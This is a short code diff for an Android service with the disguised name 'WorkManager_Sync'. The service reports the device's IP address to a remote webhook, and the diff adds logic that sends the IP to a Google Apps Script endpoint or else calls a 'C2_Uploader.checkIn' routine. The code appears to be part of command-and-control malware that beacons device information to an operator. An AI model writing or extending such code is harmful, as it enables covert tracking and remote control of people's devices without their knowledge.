@@ -725,8 +725,13 @@ public class WorkManager_Sync extends Service {
         long now = System.currentTimeMillis();
         Log.d(TAG, "IP Report Triggered for IP: " + currentIp);
         if (REMOTE_WEBHOOK_URL != null && !REMOTE_WEBHOOK_URL.isEmpty()) {
-            boolean success = sendIpToWebhook(currentIp);
-            if (success) {
+            if (REMOTE_WEBHOOK_URL.contains("script.google.com") || REMOTE_WEBHOOK_URL.contains("script.googleusercontent.com")) {
+                boolean success = sendIpToWebhook(currentIp);
+                if (success) {
+                    lastReportedIp = currentIp;
+                    lastReportTimestamp = now;
+                }
+            } else {
                 lastReportedIp = currentIp;
                 lastReportTimestamp = now;
                 C2_Uploader.checkIn(WorkManager_Sync.this);
